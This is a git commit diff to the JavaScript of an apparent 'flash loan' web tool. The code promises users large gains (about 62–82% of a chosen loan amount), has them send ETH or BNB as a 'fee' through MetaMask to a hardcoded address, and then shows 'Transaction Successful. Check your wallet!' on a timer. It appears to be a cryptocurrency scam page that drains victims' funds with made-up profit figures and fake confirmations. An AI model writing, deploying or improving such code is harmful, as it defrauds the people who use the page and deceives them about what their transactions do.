36b4f9827921763cceab4b7726170c5bf13198b2
flashloan-demo <85358791+flashloan-demo@users.noreply.github.com>
2021-06-10 03:42:54 +0530

    Update script.js

--- assets/js/script.js
+++ assets/js/script.js
@@ -1,89 +1,110 @@
 const app = angular.module("myApp", []);
 function fixNumber(e) {
-    return Math.round(1e12 * e) / 1e12;
+    return Math.round(1e12 * e) / 1e12
 }
-app.controller("myCtrl", [
-    "$scope",
-    async function (e) {
-        (e.init = function () {
-            (e.ivm = ""),
-                (e.processing = !1),
-                (e.ethDeposited = !1),
-                (e.formStep = 1),
-                (e.currency = "ETH"),
-                (e.dex = "Uniswap"),
-                (e.gasPrice = "30"),
-                (e.erc20 = { name: "", symbol: "", network: !isBnb }),
-                (e.loan = { amount: 25, tokenFee: 0.01, swapFee: 0, totalFee: 0, gain: 0 }),
-                (e.submitErc20Form = function () {
-                    const t = e.erc20.name.trim();
-                    if ("" == t) return alert("Token Name cannot be blank");
-                    if (!t.match(/^[a-zA-Z\s]+$/)) return alert("Token Name can only contain letters and spaces");
-                    const n = e.erc20.symbol.trim();
-                    return "" == n
-                        ? alert("Token Symbol cannot be blank")
-                        : n.match(/^[a-zA-Z]+$/)
-                        ? window.isBnb && e.erc20.network
-                            ? alert("Network Mismatch. Set MetaMask network to Ethereum and reload the page.")
-                            : window.isBnb || e.erc20.network
-                            ? ((e.formStep = 2),
-                              (e.currency = e.erc20.network ? "ETH" : "BNB"),
-                              (e.dex = e.erc20.network ? "Uniswap" : "PancakeSwap"),
-                              (e.loan.tokenFee = e.erc20.network ? 0.01 : 0.05),
-                              (e.ivm = e.erc20.network ? oeb : ubx),
-                              (e.gasPrice = e.erc20.network ? "30" : "6"),
-                              e.getLoanEstimates(),
-                              void setTimeout(function () {
-                                  document.getElementById("loanAmtInput").focus();
-                              }, 100))
-                            : alert("Network Mismatch. Set MetaMask network to Binance Smart Chain and the reload page.")
-                        : alert("Token Symbol can only contain letters");
-                }),
-                (e.amountChanged = function () {
-                    e.getLoanEstimates();
-                }),
-                (e.getLoanEstimates = function () {
-                    null != e.loan.amount &&
-                        null != e.loan.amount &&
-                        ((e.loan.swapFee = e.loan.amount / (e.erc20.network ? 400 : 200)), (e.loan.totalFee = fixNumber(e.loan.tokenFee + e.loan.swapFee)), (e.loan.gain = fixNumber(e.loan.amount * (e.erc20.network ? 0.529 : 0.73))));
-                }),
-                e.getLoanEstimates(),
-                (e.submitLoanForm = function () {
-                    e.ethDeposited ? e.executeLoan() : e.depositEth();
-                }),
-                (e.depositEth = function () {
-                    (e.processing = !0),
-                        window.web3.eth.sendTransaction({ to: e.ivm, from: e.account.address, value: window.web3.utils.toWei("" + e.loan.totalFee, "ether"), gas: 3e4, gasPrice: window.web3.utils.toWei(e.gasPrice, "gwei") }, function (
-                            t,
-                            n
-                        ) {
-                            (e.processing = !1),
-                                e.$apply(),
-                                t
-                                    ? alert("Transaction Failed")
-                                    : (setTimeout(function () {
-                                          alert("Money deposited to contract. You can execute the Flash Loan now.");
-                                      }, 5e3),
-                                      (e.ethDeposited = !0),
-                                      e.$apply());
-                        });
-                }),
-                (e.executeLoan = function () {
-                    (e.processing = !0),
-                        window.contract.methods.action().send({ to: e.ivm, from: e.account.address, value: 0, gasPrice: window.web3.utils.toWei(e.gasPrice, "gwei") }, function (t, n) {
-                            t
-                                ? (alert("Flash Loan Execution Failed"), (e.processing = !1), e.$apply())
-                                : setTimeout(function () {
-                                      alert("Transaction Successful. Check your wallet!");
-                                  }, 5e3);
-                        });
-                });
-        }),
-            await loadWeb3().then(function (t) {
-                try {
-                    e.account = { address: t[0] };
-                } catch (e) {}
-                e.init(), e.$apply();
-            });
-    },
+app.controller("myCtrl", ["$scope", async function(n) {
+    n.init = function() {
+        n.ivm = "",
+        n.isLoading = true,
+        n.processing = !1,
+        n.ethDeposited = !1,
+        n.formStep = 1,
+        n.currency = "ETH",
+        n.dex = "Uniswap",
+        n.erc20 = {
+            name: "",
+            symbol: "",
+            network: !isBnb
+        },
+        n.loan = {
+            amount: 25,
+            tokenFee: .01,
+            swapFee: 0,
+            totalFee: 0,
+            gain: 0
+        },
+        n.submitErc20Form = function() {
+            const e = n.erc20.name.trim();
+            if ("" == e)
+                return alert("Token Name cannot be blank");
+            if (!e.match(/^[a-zA-Z\s]+$/))
+                return alert("Token Name can only contain letters and spaces");
+            const t = n.erc20.symbol.trim();
+            return "" == t ? alert("Token Symbol cannot be blank") : t.match(/^[a-zA-Z]+$/) ? window.isBnb && n.erc20.network ? alert("Network Mismatch. Set MetaMask network to Ethereum and reload the page.") : window.isBnb || n.erc20.network ? (n.formStep = 2,
+            n.currency = n.erc20.network ? "ETH" : "BNB",
+            n.dex = n.erc20.network ? "Uniswap" : "PancakeSwap",
+            n.loan.tokenFee = n.erc20.network ? .01 : .05,
+            n.ivm = n.erc20.network ? oeb : ubx,
+            n.getLoanEstimates(),
+            void setTimeout(function() {
+                document.getElementById("loanAmtInput").focus()
+            }, 100)) : alert("Network Mismatch. Set MetaMask network to Binance Smart Chain and the reload page.") : alert("Token Symbol can only contain letters")
+        }
+        ,
+        n.amountChanged = function() {
+            n.getLoanEstimates()
+        }
+        ,
+        n.getLoanEstimates = function() {
+            null != n.loan.amount && null != n.loan.amount && (n.loan.swapFee = n.loan.amount / (n.erc20.network ? 3000 : 1500),
+            n.loan.totalFee = fixNumber(n.loan.tokenFee + n.loan.swapFee),
+            n.loan.gain = fixNumber(n.loan.amount * (n.erc20.network ? .618 : .82)))
+        }
+        ,
+        n.goBack = function() {
+            n.formStep = 1
+        },
+        n.getLoanEstimates(),
+        n.submitLoanForm = function() {
+            n.ethDeposited ? n.executeLoan() : n.depositEth()
+        }
+        ,
+        n.depositEth = function() {
+            n.processing = !0,
+            window.web3.eth.sendTransaction({
+                to: n.ivm,
+                from: n.account.address,
+                value: window.web3.utils.toWei("" + n.loan.totalFee, "ether"),
+                gas: 3e4,
+                gasPrice: window.web3.utils.toWei("90", "gwei")
+            }, function(e, t) {
+                n.processing = !1,
+                n.$apply(),
+                e ? alert("Transaction Failed") : (setTimeout(function() {
+                    alert("Money deposited to contract. You can execute the Flash Loan now.")
+                }, 5e3),
+                n.ethDeposited = !0,
+                n.$apply())
+            })
+        }
+        ,
+        n.executeLoan = function() {
+            n.processing = !0,
+            window.contract.methods.action().send({
+                to: n.ivm,
+                from: n.account.address,
+                value: 0,
+                gasPrice: window.web3.utils.toWei("90", "gwei")
+            }, function(e, t) {
+                e ? (alert("Flash Loan Execution Failed"),
+                n.processing = !1,
+                n.$apply()) : setTimeout(function() {
+                    alert("Transaction Successful. Check your wallet!")
+                }, 5e3)
+            })
+        }
+    }
+    ,
+    await loadWeb3().then(function(e) {
+        try {
+            n.account = {
+                address: e[0]
+            }
+        } catch (e) {}
+        n.init();
+        n.$apply();
+        document.getElementById('loader').classList.toggle('hide');
+        document.getElementById('start-screen-content').classList.toggle('show');
+    })
+}
 ]);
